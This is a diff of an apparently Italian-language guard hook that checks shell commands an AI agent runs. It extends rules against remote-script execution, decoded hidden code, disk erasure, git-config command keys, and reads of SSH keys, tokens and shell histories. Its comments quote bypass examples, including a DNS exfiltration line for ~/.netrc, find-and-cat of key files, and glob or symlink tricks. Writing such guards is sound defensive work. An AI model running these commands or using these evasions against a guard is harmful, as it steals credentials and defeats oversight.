@@ -44,6 +44,7 @@ CHIEDE CONFERMA (permissionDecision:"ask", exit 0):
 
 Fail-open su parsing (i casi catastrofici su path root restano nei deny).
 """
+import collections
 import json
 import re
 import sys
@@ -122,6 +123,9 @@ DANGEROUS = [
     (r"\bchown\s+-R\s+\S+\s+/(\s|$)", "cambio ownership ricorsivo su root"),
     (r"\b(bash|sh|zsh|fish|python3?|perl|ruby|node|php)\b\s+<\(\s*(curl|wget|fetch)\b",
      "esecuzione via process-substitution di script remoto"),
+    # 21/11/2026 (#6259, S5): `source <(curl …)` e `. <(curl …)` eseguono lo script come `bash <(curl …)`.
+    (r"(?:^|[;&|(\n])\s*(?:source|\.)\s+<\(\s*(curl|wget|fetch)\b",
+     "esecuzione via process-substitution di script remoto"),
     (r"\beval\b[^\n]*\$\(\s*(curl|wget|fetch)\b",
      "eval di output di download remoto"),
     (r"\b(bash|sh|zsh|fish|python3?|perl|ruby|node)\b\s+-c\s+[\"']?\$\(\s*(curl|wget|fetch)\b",
@@ -132,6 +136,9 @@ DANGEROUS = [
 # `grep -n 'bw export' README.md` sembrava un export (finding 10).
 # `bw export` anche con opzioni e valori davanti (`bw --session X export`): il deny di settings.json
 # copre solo la forma letterale. `--help` non esporta niente: resta libero (12/9/2026).
+_DISKUTIL_CANCELLA = re.compile(
+    r"^(?:apfs\s+|cs\s+|corestorage\s+|appleraid\s+|ar\s+)?(?:erase\w*|reformat|zerodisk|randomdisk|secureerase|"
+    r"partitiondisk|delete\w*|destroy\w*|removedisk)\b", re.IGNORECASE)
 _BW_EXPORT = re.compile(r"^(?:-[-\w]+(?:\s+[^\s-]\S*)?\s+)*export(?:\s|$)(?!\s*(?:--help|-h)\b)")
 
 # --- Percorsi protetti: una tabella sola (#5122, passo 5) ---
@@ -144,6 +151,7 @@ _BW_EXPORT = re.compile(r"^(?:-[-\w]+(?:\s+[^\s-]\S*)?\s+)*export(?:\s|$)(?!\s*(
 #   nome-radice    un nome, anche con *, direttamente in ~/.claude;
 #   nome-cartella  "cartella/nome": un nome, anche con *, in una cartella di ~/.claude;
 #   albero-home    la cartella sotto la home e tutto quello che contiene;
+#   file-home      un file sotto la home;
 #   pezzo          un pezzo di percorso in qualunque punto, e quello che sta sotto;
 #   nome-ovunque   il nome del file, in qualunque cartella;
 #   nome-sotto     "cartella/nome": un nome, anche con *, a qualunque profondità sotto una cartella con quel nome.
@@ -200,6 +208,28 @@ PERCORSI_PROTETTI = (
     ("avvio-automatico", "nome-sotto", "WindowsPowerShell/*profile.ps1",
      "~/Documents/WindowsPowerShell/Microsoft.PowerShell_profile.ps1", True),
     ("avvio-automatico", "nome-sotto", "PowerShell/*profile.ps1", "~/Documents/PowerShell/profile.ps1", True),
+    # 21/11/2026 (#6259, rilievo S4 della revisione del 20/11): altro codice che parte da solo. I file della
+    # persona che Arturo esegue a ogni avvio, a ogni chiusura e a ogni ridisegno della barra (aspetto.json
+    # sceglie quale .js la barra carica); la config di git, dove core.fsmonitor, core.pager, core.sshCommand e
+    # gli alias con `!` sono comandi; i file che la shell legge a ogni apertura; le chiavi che possono entrare
+    # via ssh. Solo sul percorso risolto: nel testo `.zshrc` è anche la sorgente di un cp.
+    ("avvio-automatico", "nome-cartella", "personale/*.sh", "~/.claude/personale/session-start.sh", False),
+    ("avvio-automatico", "nome-cartella", "personale/*.js", "~/.claude/personale/barra.js", False),
+    ("avvio-automatico", "file-claude", "personale/aspetto.json", "~/.claude/personale/aspetto.json", False),
+    ("avvio-automatico", "pezzo", ".git/config", "progetto/.git/config", False),
+    ("avvio-automatico", "file-home", ".gitconfig", "~/.gitconfig", False),
+    ("avvio-automatico", "file-home", ".config/git/config", "~/.config/git/config", False),
+    ("avvio-automatico", "file-home", ".ssh/authorized_keys", "~/.ssh/authorized_keys", False),
+    ("avvio-automatico", "file-home", ".ssh/rc", "~/.ssh/rc", False),
+    ("avvio-automatico", "file-home", ".zshrc", "~/.zshrc", False),
+    ("avvio-automatico", "file-home", ".zshenv", "~/.zshenv", False),
+    ("avvio-automatico", "file-home", ".zprofile", "~/.zprofile", False),
+    ("avvio-automatico", "file-home", ".zlogin", "~/.zlogin", False),
+    ("avvio-automatico", "file-home", ".bashrc", "~/.bashrc", False),
+    ("avvio-automatico", "file-home", ".bash_profile", "~/.bash_profile", False),
+    ("avvio-automatico", "file-home", ".bash_login", "~/.bash_login", False),
+    ("avvio-automatico", "file-home", ".profile", "~/.profile", False),
+    ("avvio-automatico", "file-home", ".config/fish/config.fish", "~/.config/fish/config.fish", False),
 )
 # Come ogni regola tratta le maiuscole, uguale a prima della tabella. Nel predicato "piega" confronta con
 # _piega (macOS e Windows ignorano le maiuscole, finding 11), "nome" mette in minuscolo solo il nome del
@@ -382,6 +412,9 @@ _SECRET_REDIR_RE = re.compile(
     r"id_(rsa|ed25519|ecdsa|dsa)\b(?!\.pub\b)|\.aws/(?!config(?![\w.-]))|\.gnupg/|"
     r"\.git-credentials|\.pem|credentials\.json|\.pypirc|secrets\.env|\.secrets/|"
     r"token_cache\.json|client_secret|\.claude/data/credentials/|"
+    # 21/11/2026 (#6259, S13): `dig "$(base64 < ~/.netrc).host"` porta fuori il file senza un lettore
+    r"\.netrc(?![\w.-])|\.npmrc(?![\w.-])|\.kube/config(?![\w.-])|\.docker/config\.json|\.config/gh/hosts\.yml|"
+    r"\.(?:zsh|bash)_history|"
     r"(?<![\w.])\.env\b(?!\.(?:example|sample|template|dist)\b))",
     re.IGNORECASE,
 )
@@ -393,8 +426,11 @@ def _programma_pericoloso(testo: str):
     davvero (banco della config, 9/11/2026: il lotto L2 l'aveva lasciato passare)."""
     for sorgente in [testo] + _cmd_subst_bodies(testo):
         for nome, args in _fc.programmi(sorgente):
-            if nome.startswith("mkfs.") or nome == "mkfs":
+            if nome.startswith("mkfs.") or nome == "mkfs" or nome.startswith("newfs_") or nome == "newfs":
                 return "format filesystem"
+            # 21/11/2026 (#6259, S9): diskutil cancella un disco o un volume intero, come mkfs.
+            if nome == "diskutil" and _DISKUTIL_CANCELLA.search(" ".join(args)):
+                return "cancellazione di un disco o di un volume con diskutil"
             if nome == "bw" and _BW_EXPORT.match(" ".join(args)):
                 return "export dell'intera vault Bitwarden in chiaro"
     return None
@@ -547,7 +583,13 @@ def _reads_secret(command: str) -> bool:
 # chiede qualunque sia il programma. Passano solo i programmi che non stampano il contenuto (elenco chiuso).
 _SEGRETI_CASA = re.compile(r"^(?:\.ssh(?:/.*)?|\.aws/(?!config$).+|\.gnupg(?:/.*)?|\.netrc|\.secrets(?:/.*)?|"
                            r"\.git-credentials|\.claude/data/credentials(?:/.*)?|\.config/gh/hosts\.yml|"
-                           r"\.docker/config\.json|\.kube/config|\.pypirc|\.npmrc|\.claude\.json)$")
+                           r"\.docker/config\.json|\.kube/config|\.pypirc|\.npmrc|\.claude\.json|"
+                           # 21/11/2026 (#6259, S6): la cronologia della shell e dei client tiene i token scritti
+                           # a mano in un comando.
+                           r"\.(?:zsh_history|zhistory|bash_history|sh_history|psql_history|mysql_history|"
+                           r"python_history|node_repl_history)|\.local/share/fish/fish_history)$")
+_CRONOLOGIE = (".zsh_history", ".zhistory", ".bash_history", ".sh_history", ".psql_history", ".mysql_history",
+               ".python_history", ".node_repl_history")
 _SSH_PUBBLICI = re.compile(r"^\.ssh(?:/(?:config|config\.d(?:/.*)?|known_hosts(?:\.old)?|authorized_keys|"
                            r"[^/]*\.pub|agent|sockets?(?:/.*)?|control.*))?$")
 _INNOCUI_SEGRETI = frozenset("ls stat chmod chown chgrp mkdir rmdir touch test [ [[ du realpath readlink dirname "
@@ -555,11 +597,68 @@ _INNOCUI_SEGRETI = frozenset("ls stat chmod chown chgrp mkdir rmdir touch test [
                              "ssh ssh-add ssh-keygen ssh-copy-id ssh-agent ssh-keyscan rm cd pushd popd true false "
                              "exa eza tree xattr".split())
 _GLOB_CARATTERI = re.compile(r"[*?\[]")
+# Gli stessi segreti di _SEGRETI_CASA, come elenchi: un glob si confronta pezzo per pezzo con ognuno (#6279).
+_SEGRETI_CASA_FILE = (".netrc", ".git-credentials", ".pypirc", ".npmrc", ".claude.json", ".config/gh/hosts.yml",
+                      ".docker/config.json", ".kube/config", ".local/share/fish/fish_history") + _CRONOLOGIE
+_SEGRETI_CASA_CARTELLE = (".ssh", ".aws", ".gnupg", ".secrets", ".claude/data/credentials")
+# `shopt -s dotglob` e `setopt globdots`: con queste `*` trova anche i nomi che cominciano col punto.
+_PUNTO_NEI_GLOB = re.compile(r"dotglob|glob_?dots", re.IGNORECASE)
+_GRAFFE_TETTO = 64
 
 
-def _segreto_di_casa(p: str, cartella: bool = False) -> bool:
+def _combacia(nome: str, pezzo: str, punto: bool = False) -> bool:
+    """True se il pezzo di glob trova `nome`, come nella shell: un nome che comincia col punto vuole il punto
+    scritto (`*.json` non trova `.claude.json`, `*` non entra in `.ssh`), salvo con dotglob."""
+    if nome.startswith(".") and not pezzo.startswith(".") and not punto:
+        return False
+    return fnmatch.fnmatchcase(nome, pezzo)
+
+
+def _espandi_graffe(t: str) -> list:
+    """Le parole che la shell ricava dalle graffe (`~/.s{sh,x}/id` dà `~/.ssh/id` e `~/.sx/id`). La shell le
+    espande prima di tilde, variabili e glob. `${VAR}` e una graffa senza virgola restano come sono; oltre
+    _GRAFFE_TETTO parole si tiene la parola scritta."""
+    fatte, coda = [], [t]
+    while coda:
+        parola = coda.pop()
+        inizio = fine = -1
+        virgole = []
+        i = 0
+        while i < len(parola) and fine < 0:
+            if parola[i] == "\\":
+                i += 2
+                continue
+            if parola[i] == "{" and not (i and parola[i - 1] == "$"):
+                livello, virgole, j = 1, [], i + 1
+                while j < len(parola) and livello:
+                    if parola[j] == "\\":
+                        j += 2
+                        continue
+                    if parola[j] == "{":
+                        livello += 1
+                    elif parola[j] == "}":
+                        livello -= 1
+                    elif parola[j] == "," and livello == 1:
+                        virgole.append(j)
+                    j += 1
+                if not livello and virgole:
+                    inizio, fine = i, j - 1
+            i += 1
+        if fine < 0:
+            fatte.append(parola)
+            continue
+        tagli = [inizio] + virgole + [fine]
+        for a, b in zip(tagli, tagli[1:]):
+            coda.append(parola[:inizio] + parola[a + 1:b] + parola[fine + 1:])
+        if len(fatte) + len(coda) > _GRAFFE_TETTO:
+            return [t]
+    return fatte
+
+
+def _segreto_di_casa(p: str, cartella: bool = False, punto: bool = False) -> bool:
     """True se il percorso assoluto `p` è un segreto della home, anche come pattern glob. La cartella ~/.ssh da
-    sola non lo è (`cat ~/.ssh` non legge niente); i lettori di cartelle li giudica _reads_secret_flat."""
+    sola non lo è (`cat ~/.ssh` non legge niente); i lettori di cartelle li giudica _reads_secret_flat.
+    `punto`: il comando accende dotglob, e `*` trova anche i nomi col punto."""
     h = os.path.normpath(_home())
     p = os.path.normpath(p)
     if not p.startswith(h + os.sep):
@@ -570,17 +669,27 @@ def _segreto_di_casa(p: str, cartella: bool = False) -> bool:
     if cartella and rel in (".ssh", ".aws", ".gnupg", ".secrets", ".claude/data/credentials"):
         return True
     if not _GLOB_CARATTERI.search(rel):
-        return "/" in rel or rel in (".netrc", ".git-credentials", ".pypirc", ".npmrc", ".claude.json") \
+        return "/" in rel or rel in (".netrc", ".git-credentials", ".pypirc", ".npmrc", ".claude.json") + _CRONOLOGIE \
             if _SEGRETI_CASA.match(rel) and not _SSH_PUBBLICI.match(rel) else False
-    # un glob: conta se una cartella dei segreti ci rientra (`.[s]sh/id_*`, `.s?h/github`)
+    # un glob: conta se un segreto ci rientra, pezzo per pezzo (`.[s]sh/id_*`, `.s?h/github`, `.np?rc`,
+    # `.d*/c*.json`). Dal 21/11/2026 (#6279) anche i file fuori dalle cartelle dei segreti e, per chi legge
+    # le cartelle, la cartella intera (`grep -r x ~/.s??`).
     parti = rel.split("/")
-    for nome in (".ssh", ".aws", ".gnupg", ".netrc", ".secrets", ".git-credentials"):
-        if fnmatch.fnmatchcase(nome, parti[0]):
-            resto = "/".join([nome] + parti[1:])
-            if nome in (".netrc", ".git-credentials") and len(parti) == 1:
+    for nome in _SEGRETI_CASA_FILE:
+        pezzi = nome.split("/")
+        if len(pezzi) == len(parti) and all(_combacia(a, b, punto) for a, b in zip(pezzi, parti)):
+            return True
+    for nome in _SEGRETI_CASA_CARTELLE:
+        pezzi = nome.split("/")
+        if len(parti) < len(pezzi) or not all(_combacia(a, b, punto) for a, b in zip(pezzi, parti)):
+            continue
+        if len(parti) == len(pezzi):
+            if cartella:
                 return True
-            if len(parti) > 1 and not re.search(r"\.pub$|^\.ssh/(?:config|known_hosts|authorized_keys)$", resto):
-                return True
+            continue
+        resto = "/".join(pezzi + parti[len(pezzi):])
+        if not re.search(r"\.pub$|^\.ssh/(?:config|known_hosts|authorized_keys)$", resto):
+            return True
     return False
 
 
@@ -590,6 +699,7 @@ def _segreti_risolti(command: str, cwd: str) -> bool:
         voci = _programmi_con_cd(_fc.testo_shell(command))
     except Exception:
         return False
+    punto = bool(_PUNTO_NEI_GLOB.search(command))
     for nome, args, cds in voci:
         nome = _fc._nome(nome)
         if nome in _INNOCUI_SEGRETI:
@@ -601,7 +711,10 @@ def _segreti_risolti(command: str, cwd: str) -> bool:
             continue
         # la cartella intera conta per chi la sposta, la copia o la manda (`mv ~/.ssh x`); per un lettore di
         # un file solo (`cat ~/.ssh`) no, e i lettori di cartelle li giudica _reads_secret_flat
-        cartella = nome not in _READ_BINS or nome in _LEGGONO_CARTELLE
+        cartella = nome not in _READ_BINS or nome in _LEGGONO_CARTELLE or (
+            nome in ("grep", "egrep", "fgrep") and any(
+                t in ("--recursive", "--dereference-recursive") or (t.startswith("-") and not t.startswith("--")
+                                                                    and ("r" in t or "R" in t)) for t in args))
         basi = [b for b in _basi_dopo_cd(cds, cwd) if b] if cwd else []
         j = 0
         while j < len(args):
@@ -614,25 +727,33 @@ def _segreti_risolti(command: str, cwd: str) -> bool:
                 a = a.split("=", 1)[1]
             elif a.startswith("-") or not a or (" " in a.strip() and not a.startswith(("/", "~", "$"))):
                 continue  # un'opzione, o prosa
-            t = _expand_vars(a)
-            if t is None:
-                continue
-            t = os.path.expanduser(t)
-            for base in ([None] if os.path.isabs(t) else basi):
-                q = os.path.normpath(t if base is None else os.path.join(base, t))
-                if _segreto_di_casa(q, cartella):
-                    return True
-                try:
-                    if not _GLOB_CARATTERI.search(q) and os.path.islink(q) and _segreto_di_casa(os.path.realpath(q)):
+            # le graffe prima di tutto, come nella shell: `~/.s{sh,x}/i?_ed25519` (21/11/2026, #6279)
+            for parola in (_espandi_graffe(a) if "{" in a else [a]):
+                t = _expand_vars(parola)
+                if t is None:
+                    continue
+                t = os.path.expanduser(t)
+                for base in ([None] if os.path.isabs(t) else basi):
+                    q = os.path.normpath(t if base is None else os.path.join(base, t))
+                    if _segreto_di_casa(q, cartella, punto):
                         return True
-                except OSError:
-                    pass
+                    # un link su qualunque pezzo del percorso, non solo sull'ultimo: `cat lnk/github` con lnk
+                    # verso ~/.ssh (21/11/2026, #6200)
+                    try:
+                        if not _GLOB_CARATTERI.search(q):
+                            vero = os.path.realpath(q)
+                            if vero != q and _segreto_di_casa(vero, cartella, punto):
+                                return True
+                    except OSError:
+                        pass
     return False
 
 
 # `security` di macOS stampa la password con -w o -g, e dump-keychain -d stampa tutto il portachiavi.
-_SECURITY_SEGRETO = re.compile(r"(?:^|[\s;&|(])security\s+(?:find-(?:generic|internet)-password\b[^\n;&|]*\s-[a-zA-Z]*[wg]\b|"
-                               r"dump-keychain\b[^\n;&|]*\s-[a-zA-Z]*d\b)")
+# 21/11/2026 (#6259, S6): anche col percorso davanti (`/usr/bin/security`), con le lettere in un gruppo
+# (`-ga`) e dump-keychain senza -d, che stampa comunque nomi, account e servizi di ogni voce.
+_SECURITY_SEGRETO = re.compile(r"(?:^|[\s;&|(/])security\s+(?:find-(?:generic|internet)-password\b[^\n;&|]*\s-[a-zA-Z]*[wg][a-zA-Z]*\b|"
+                               r"dump-keychain\b)", _RE_NOMI)
 
 
 # Il tokenizer (heredoc, messaggi di commit, segmenti) sta in forma_comando.py dal 15/10/2026:
@@ -1136,14 +1257,14 @@ def _protetto(regola, p):
             if piega(pezzi[0]) in cartella.split(os.sep) and fnmatch.fnmatchcase(nome, piega(pezzi[-1])):
                 return True
             continue
-        base = os.path.join(home, ".claude") if forma != "albero-home" else home
+        base = os.path.join(home, ".claude") if forma not in ("albero-home", "file-home") else home
         if forma in ("nome-radice", "nome-cartella"):
             dove = piega(os.path.normpath(os.path.join(base, *pezzi[:-1])))
             if cartella == dove and fnmatch.fnmatchcase(nome, piega(pezzi[-1])):
                 return True
             continue
         bersaglio = piega(os.path.normpath(os.path.join(base, *pezzi)))
-        if p == bersaglio or (forma != "file-claude" and p.startswith(bersaglio + os.sep)):
+        if p == bersaglio or (forma not in ("file-claude", "file-home") and p.startswith(bersaglio + os.sep)):
             return True
     return False
 
@@ -1429,7 +1550,7 @@ def _writes_config(command, cwd, protetto=None, sed=True, cancella=False, crea=F
         if not seg:
             continue
         try:
-            toks = shlex.split(seg)
+            toks = _fc.parole(seg)  # come shlex.split, in tempo lineare (#5347)
         except Exception:
             toks = seg.split()
         # `(cd x; …)`, `{ cd x; …; }`, `then cd x`: la parola davanti non è il programma.
@@ -1473,7 +1594,7 @@ def _writes_config(command, cwd, protetto=None, sed=True, cancella=False, crea=F
         # binario di scrittura con un target come argomento. Le redirezioni escono dalle parole: in
         # `cp x ~/.claude/ 2>/dev/null` l'ultimo argomento è la cartella, non `2>/dev/null` (#5261).
         try:
-            senza = shlex.split(_fc._senza_tratti_redirezione(seg))
+            senza = _fc.parole(_fc._senza_tratti_redirezione(seg))
             while senza and (senza[0] in _fc._DAVANTI or senza[0] == "("):
                 senza = senza[1:]
             if senza and senza[0].startswith("(") and len(senza[0]) > 1:
@@ -3039,6 +3160,637 @@ def _basi_dopo_cd(cds, cwd):
     return basi
 
 
+# --- Aggiramenti trovati dalla revisione del 20/11/2026 (#6259, rilievi S4, S5, S6, S9 e S13) ---
+# Banco: tests/test_aggiramenti_2026_11_21.py. I nomi di regola nuovi (scarica-esegue, codice-nascosto,
+# git-scarta, sposta-cartella, docker-monta) stanno in bin/telemetria.py e in server/logica.js (banco TF03).
+# Finché il Worker pubblicato ha l'elenco vecchio, scarta quei soli eventi: il resto del lotto entra.
+
+def _comandi_ovunque(testo):
+    """(parola del programma, argomenti) di ogni comando, anche dentro $( ) e backtick fra virgolette."""
+    out = []
+    for sorgente in [testo] + _cmd_subst_bodies(testo):
+        try:
+            out += _fc.comandi(sorgente)
+        except Exception:
+            pass
+    return out
+
+
+# S4: le chiavi della config di git il cui valore è un comando.
+_GIT_CHIAVE_COMANDO = re.compile(
+    r"^(?:core\.(?:fsmonitor|pager|editor|sshcommand|hookspath|askpass|gitproxy)|sequence\.editor|pager\..+|"
+    r"credential(?:\..+)?\.helper|diff\.external|diff\..+\.(?:textconv|command)|filter\..+\.(?:clean|smudge|process)|"
+    r"merge\..+\.driver|(?:mergetool|difftool)\..+\.cmd|gpg(?:\..+)?\.program|uploadpack\.packobjectshook|"
+    r"include\.path|includeif\..+\.path|init\.templatedir|alias\..+)$", re.IGNORECASE)
+# I valori che non eseguono niente di nuovo: un programma noto e nessun carattere di shell.
+_GIT_VALORE_NOTO = frozenset("true false 0 1 : cat less more vi vim nvim nano emacs code delta bat ssh gpg gpg2 diff "
+                             "osxkeychain store cache manager manager-core /dev/null".split())
+_GIT_CONFIG_LEGGE = frozenset(("--get", "--get-all", "--get-regexp", "--get-urlmatch", "--list", "-l", "--unset",
+                               "--unset-all", "--remove-section", "--rename-section", "-e", "--edit",
+                               "--get-color", "--get-colorbool"))
+_GIT_CONFIG_CON_VALORE = frozenset(("-f", "--file", "--blob", "--type", "--default", "--comment", "--value"))
+
+
+def _git_valore_comando(chiave, valore) -> bool:
+    """True se `chiave=valore` della config di git fa eseguire un comando che la guardia non conosce."""
+    if not _GIT_CHIAVE_COMANDO.match(chiave):
+        return False
+    valore = (valore or "").strip()
+    if chiave.lower().startswith("alias."):
+        return valore.startswith("!")
+    if not valore:
+        return False
+    if re.search(r"[;&|$`<>(){}!\n]", valore):
+        return True
+    return os.path.basename(valore.split()[0]) not in _GIT_VALORE_NOTO and valore not in _GIT_VALORE_NOTO
+
+
+def _git_config_comando(testo):
+    """La chiave se un `git config` scrive una chiave che esegue un comando (core.fsmonitor, core.pager,
+    core.hooksPath, alias con `!`…): il comando partirebbe da solo a ogni git. None altrimenti."""
+    for parola, args in _comandi_ovunque(testo):
+        if _fc._nome(parola) != "git":
+            continue
+        # `git -c core.fsmonitor='sh -c …' status`: il comando gira subito. Gli alias con `!` li legge
+        # forma_comando come comandi, e li giudicano le altre regole.
+        k = 0
+        while k < len(args) and args[k].startswith("-"):
+            a = args[k]
+            coppia = args[k + 1] if a == "-c" and k + 1 < len(args) else (a[2:] if a.startswith("-c") and
+                                                                         not a.startswith("--") else "")
+            if coppia and "=" in coppia:
+                chiave, valore = coppia.split("=", 1)
+                if not chiave.lower().startswith("alias.") and _git_valore_comando(chiave, valore):
+                    return chiave
+            if a.startswith("--config-env"):
+                coppia = a.split("=", 1)[1] if "=" in a else (args[k + 1] if k + 1 < len(args) else "")
+                chiave = coppia.split("=", 1)[0]
+                if _GIT_CHIAVE_COMANDO.match(chiave) and not chiave.lower().startswith("alias."):
+                    return chiave
+            k += 2 if a in _GIT_OPZIONI_CON_VALORE else 1
+        _, sotto, resto = _git_parti(args)
+        if sotto != "config":
+            continue
+        liberi, i, legge = [], 0, False
+        while i < len(resto):
+            a = resto[i]
+            if a in _GIT_CONFIG_LEGGE:
+                legge = True
+            if a.startswith("-") and a != "-":
+                i += 2 if a in _GIT_CONFIG_CON_VALORE else 1
+                continue
+            liberi.append(a)
+            i += 1
+        liberi = _senza_redirezioni(liberi)
+        if liberi[:1] and liberi[0] in ("get", "list", "unset", "rename-section", "remove-section", "edit"):
+            continue
+        if liberi[:1] == ["set"]:
+            liberi = liberi[1:]
+        if legge or len(liberi) < 2:
+            continue
+        if _git_valore_comando(liberi[0], liberi[1]):
+            return liberi[0]
+    return None
+
+
+# S5: un file scaricato e poi eseguito nello stesso comando.
+_ESEGUONO_SCRIPT = frozenset(_fc.SHELL | {"python", "python3", "perl", "ruby", "node", "nodejs", "php", "deno", "bun",
+                                          "osascript", "pwsh", "powershell"})
+_INSTALLANO = frozenset(("installer", "dpkg", "rpm", "hdiutil", "open"))
+_SENZA_SCRIPT = frozenset(("-c", "-e", "-E", "-m", "-"))
+
+
+def _percorso_confronto(p, cwd):
+    p = _expand_vars((p or "").strip()) or (p or "").strip()
+    p = os.path.expanduser(p)
+    if not os.path.isabs(p):
+        p = os.path.join(cwd or "/", p)
+    return os.path.normpath(p)
+
+
+def _file_scaricati(nome, args):
+    """I file che un curl o un wget scrive: -o, -O, --output, --output-document, la redirezione."""
+    out, urls, remoto, cartella, i = [], [], False, "", 0
+    while i < len(args):
+        a = args[i]
+        dopo = args[i + 1] if i + 1 < len(args) else ""
+        if a in (">", ">>", "1>", ">|") and dopo:
+            out.append(dopo)
+            i += 2
+            continue
+        m = re.match(r"^1?>>?\|?(.+)$", a)
+        if m and not a.startswith(">&"):
+            out.append(m.group(1))
+        elif nome == "curl" and (a == "--output" or re.match(r"^-[a-zA-Z]*o$", a)) and dopo:
+            out.append(dopo)
+            i += 1
+        elif nome == "curl" and (a.startswith("--output=") or re.match(r"^-[a-zA-Z]*o.+", a) and not a.startswith("--")):
+            out.append(a.split("=", 1)[1] if a.startswith("--") else a[a.index("o") + 1:])
+        elif nome == "curl" and (a in ("--remote-name", "--remote-name-all") or
+                                 (re.match(r"^-[a-zA-Z]*[OJ][a-zA-Z]*$", a) and not a.startswith("--"))):
+            remoto = True
+        elif nome == "wget" and (a == "--output-document" or re.match(r"^-[a-zA-Z]*O$", a)) and dopo:
+            out.append(dopo)
+            i += 1
+        elif nome == "wget" and (a.startswith("--output-document=") or re.match(r"^-[a-zA-Z]*O.+", a)
+                                 and not a.startswith("--")):
+            out.append(a.split("=", 1)[1] if a.startswith("--") else a[a.index("O") + 1:])
+        elif nome == "wget" and a in ("-P", "--directory-prefix") and dopo:
+            cartella = dopo
+            i += 1
+        elif "://" in a:
+            urls.append(a)
+        i += 1
+    if (nome == "wget" and not out) or remoto:
+        for u in urls:
+            base = os.path.basename(u.split("?", 1)[0].split("#", 1)[0].rstrip("/"))
+            if base:
+                out.append(os.path.join(cartella, base) if cartella else base)
+    return [x for x in out if x not in ("-", "/dev/null", "/dev/stdout")]
+
+
+def _script_di(nome, args):
+    """Il file che un interprete esegue: il primo argomento libero, se non c'è codice inline."""
+    if nome in ("source", "."):
+        return args[0] if args else None
+    for a in args:
+        if a in _SENZA_SCRIPT:
+            return None
+        if not a.startswith("-") and not _REDIREZIONE_RE.match(a):
+            return a
+    return None
+
+
+def _scarica_ed_esegue(testo, cwd):
+    """Il file se il comando lo scarica con curl o wget e poi lo esegue: nessuno ha letto cosa contiene."""
+    scaricati = set()
+    for parola, args in _comandi_ovunque(testo):
+        nome = _fc._nome(parola)
+        if nome in ("curl", "wget"):
+            scaricati.update(_percorso_confronto(x, cwd) for x in _file_scaricati(nome, args))
+            continue
+        if not scaricati:
+            continue
+        candidati = []
+        if "/" in parola or parola.startswith("."):
+            candidati.append(parola)
+        if nome in _ESEGUONO_SCRIPT or nome in ("source", "."):
+            candidati.append(_script_di(nome, args))
+        elif nome in _INSTALLANO:
+            candidati += [a for a in args if not a.startswith("-")]
+        for c in candidati:
+            if c and _percorso_confronto(c, cwd) in scaricati:
+                return c
+    return None
+
+
+# S5: testo decodificato (base64, xxd -r, openssl) e passato a una shell, che lo esegue senza che si legga.
+_DECODIFICA = (r"(?:\b(?:base64|gbase64)\b[^|;&\n]*?(?:\s-[a-zA-Z]*[dD]\b|\s--decode\b)|\bxxd\b[^|;&\n]*?\s-[a-zA-Z]*r\b|"
+               r"\bopenssl\s+(?:enc|base64)\b[^|;&\n]*?\s-d\b)")
+_SHELL_CHE_ESEGUE = r"(?:\S*/)?(?:bash|sh|zsh|dash|ksh|fish)\b|(?:\S*/)?(?:python3?|perl|ruby|node|php)\s*(?:-\s*)?(?:$|[;&|)\n])"
+_CODICE_NASCOSTO = re.compile(
+    _DECODIFICA + r"[^|;&\n]*(?:\|[^|;&\n]*)*?\|\s*(?:(?:sudo|doas)\s+)?(?:" + _SHELL_CHE_ESEGUE + r")|"
+    r"(?:\beval\b|\b(?:bash|sh|zsh|dash|ksh)\s+-[a-zA-Z]*c\b|(?:^|[;&|(\n])\s*(?:source|\.)\s)[^\n;&|]*"
+    r"(?:\$\(|`|<\()[^()`]*" + _DECODIFICA + "|"
+    r"\b(?:bash|sh|zsh|dash|ksh)\s+<\([^()]*" + _DECODIFICA, _RE_NOMI)
+
+
+# S6: find che cerca i nomi delle chiavi e li passa a un lettore.
+_FIND_NOME = frozenset(("-name", "-iname", "-path", "-ipath", "-wholename", "-iwholename", "-regex", "-iregex"))
+_NOME_DI_SEGRETO = re.compile(r"^[*?]*id_|netrc|git-credentials|pypirc|npmrc|credentials|secrets\.env|"
+                              r"_(?:rsa|ed25519|ecdsa|dsa)(?![\w])(?!\.pub)|^[*?]*\.env|\.(?:pem|ppk|key)$", re.IGNORECASE)
+
+
+def _find_legge_segreti(testo) -> bool:
+    """True se un find cerca per nome un file di chiavi o credenziali e lo fa leggere (-exec cat, | xargs cat):
+    `find ~ -name "id_*" -exec cat {} \\;` non nomina né .ssh né id_ed25519."""
+    voci = [(_fc._nome(p), a) for p, a in _comandi_ovunque(testo)]
+    xargs_legge = any(n == "xargs" and (_fc.xargs_resto(a)[:1] and _fc._nome(_fc.xargs_resto(a)[0]) in _READ_BINS)
+                      for n, a in voci)
+    for nome, args in voci:
+        if nome != "find":
+            continue
+        cercati = [args[k + 1] for k, a in enumerate(args[:-1]) if a in _FIND_NOME]
+        if not any(_NOME_DI_SEGRETO.search(c) and not c.endswith(".pub") and not _ESEMPIO.search(c)
+                   for c in cercati):
+            continue
+        legge = xargs_legge
+        for k, a in enumerate(args[:-1]):
+            if a in ("-exec", "-execdir", "-ok", "-okdir") and _fc._nome(args[k + 1]) in _READ_BINS | _fc.SHELL:
+                legge = True
+        if legge:
+            return True
+    return False
+
+
+def _git_credenziali(testo) -> bool:
+    """True per `git credential fill` e `git credential-<helper> get`: stampano la password salvata."""
+    for parola, args in _comandi_ovunque(testo):
+        nome = _fc._nome(parola)
+        if nome.startswith("git-credential") and "get" in args:
+            return True
+        if nome != "git":
+            continue
+        _, sotto, resto = _git_parti(args)
+        if (sotto == "credential" and resto[:1] == ["fill"]) or (sotto.startswith("credential-") and "get" in resto):
+            return True
+    return False
+
+
+# S9: git che butta via le modifiche non salvate, in ogni forma (`git -C dir reset --hard`, `--git-dir=`).
+def _git_scarta(command, cwd):
+    """Il motivo se un git reset --hard, checkout -- <path> o restore <path> butta via modifiche che non stanno in
+    nessun commit. Tace quando la cartella è un repository pulito e il reset resta su HEAD."""
+    for nome, args, cds in _programmi_con_cd(_fc.testo_shell(command)):
+        if _fc._nome(nome) != "git":
+            continue
+        cartella, sotto, resto = _git_parti(args)
+        if sotto not in ("reset", "checkout", "restore"):
+            continue
+        resto = _senza_redirezioni(resto)
+        altrove = any(a.startswith(("--git-dir", "--work-tree")) for a in args[:len(args) - len(resto)])
+        if sotto == "reset":
+            if not any(a in _GIT_RESET_RISCRIVE for a in resto):
+                continue
+            bersagli = [a for a in resto if not a.startswith("-")]
+            percorsi, cosa = [], "git reset --hard"
+            sposta = any(b not in ("HEAD", "@") for b in bersagli)
+        else:
+            if sotto == "restore" and any(a in ("--staged", "-S") for a in resto) and \
+                    not any(a in ("--worktree", "-W") for a in resto):
